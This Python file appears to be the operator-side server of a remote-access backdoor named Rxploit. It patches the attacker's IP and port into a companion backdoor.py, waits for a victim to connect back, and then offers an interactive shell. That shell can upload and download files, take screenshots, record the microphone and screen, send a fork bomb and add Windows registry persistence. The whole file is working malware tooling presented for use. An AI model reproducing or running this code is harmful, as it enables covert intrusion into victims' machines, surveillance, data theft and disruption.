import argparse
import fileinput
import json
import os
import socket
import sys
import termcolor
import py_compile

# main veriables
_author = "Joseph frank"
_ver = 1.3
_github = "https://github.com/JosephFrankFir/Rxploit"

# setup argument
ap = argparse.ArgumentParser()
ap.add_argument("-rh", "--rhost", required=True, help="Victim ip")
ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
ap.add_argument("-p", "--port", required=True, help="Port")
ap.add_argument("-c", "--compile", required=False, help="Compiler payload file, example: python server.py -c y")
args = vars(ap.parse_args())

if args['lhost']:
    LHOST = str(args['lhost'])
if args['rhost']:
    RHOST = str(args['rhost'])
if args['port']:
    PORT = int(args['port'])
if args['compile']:
    if str(args['compile']) == 'y':
        try:
            py_compile.compile("backdoor.py")
            print(termcolor.colored("[+] Finished compiling", 'green'))
            print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
        except py_compile.PyCompileError:
            print(termcolor.colored("[+] Error: can not compile :-(",'red'))
    if str(args['compile']) == 'n':
        pass
    else:
        print(termcolor.colored("[-] Error expected one argument", 'red'))
        usernput = input(termcolor.colored("Do you want to exit y/n: "))
        if usernput == 'y':
            exit()
        elif usernput == 'n':
            os.system('clear')
            pass



def modify_backdoor():
    file = open('backdoor.py')
    _content = file.readlines()
    for i, line in enumerate(fileinput.input('backdoor.py', inplace=1)):
        sys.stdout.write(line.replace(_content[17], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
    print(termcolor.colored("[+] Modifying backdoor file", 'green'))


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()


def target_reqs():
    count = 0
    while True:
        cmd = input(termcolor.colored('* Shell~%s: ' % str(ip), 'red'))
        reliable_send(cmd)
        if cmd == 'exit':
            print(termcolor.colored('[-] Goodbye', 'red'))
            break
        elif cmd == 'help':
            print(termcolor.colored("""
         exit                                   # Exit Session With The Target
         clear                                  # Clear The Screen
         screenshot                             # Take a Screenshot of The Target Machine
         record *seconds*                       # Record a file using Target Machine microphone
         screen_record *on*                     # Record victim's desktop
         forkbomb                               # Send forkbomb To The Target Machine
         sysinfo                                # Get Target Machine Info
         cd *Dir Name*                          # Changes Directory On Target Machine
         upload *File Name*                     # Upload File To The Target Machine
         download *File name*                   # Download File From The Target Machine
         persistence *RegName* *FileName*       # Create Persistence In Registry, Note Working On Windows Only
         """, 'blue'))
        elif cmd == 'clear':
            os.system('clear')
        elif cmd[:3] == 'cd ':
            print(reliable_recv())
        elif cmd[:6] == 'upload':
            try:
                upload_file(cmd[7:])
                print(termcolor.colored('[+] Done Uploaded file', 'green'))
                pass
            except FileNotFoundError:
                pass
        elif cmd[:8] == 'download':
            try:
                download_file(cmd[9:])
                print(termcolor.colored('[+] Done Downloaded file', 'green'))
            except FileNotFoundError:
                pass
        elif cmd == 'screenshot':
            f = open('screenshot%d.png' % count, 'wb')
            target.settimeout(10)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout:
                    break
            target.settimeout(None)
            f.close()
            os.replace("screenshot%d.png" % count, "images/screenshot%d.png" % count)
            count += 1
            print(termcolor.colored('[+] Done screenshot saved', 'green'))
        elif cmd[:6] == 'record':
            f = open('recorded%d.wav' % count, 'wb')
            _timeout = int(cmd[7:]) + 7
            target.settimeout(_timeout)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout:
                    break
            target.settimeout(None)
            f.close()
            os.replace("recorded%d.wav" % count, "recordings/recorded%d.wav" % count)
            count += 1
            print(termcolor.colored('[+] Done recorded file', 'green'))

        elif cmd[:13] == 'screen_record':
            if cmd[14:] == 'on':
                print(termcolor.colored('[+] Go to http://*target ip*/:5000', 'green'))
            elif cmd[14:] == 'off':
                print(termcolor.colored('[+] Done', 'green'))
            else:
                print(termcolor.colored('[-] Wrong command', 'red'))

        elif cmd[:11] == 'persistence':
            log = reliable_recv()
            print(log)
            pass
        elif cmd == "sysinfo":
            log = reliable_recv()
            print(log)
        elif cmd == "forkbomb":
            res = reliable_recv()
            print(res)
        else:
            result = reliable_recv()
            print(result)


modify_backdoor()
skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.bind((RHOST, PORT))
print(termcolor.colored("[+] Listening for incoming requests", "green"))
skt.listen(5)
target, ip = skt.accept()
print(termcolor.colored("[+] Target connected from: " + str(ip), "green"))
target_reqs()
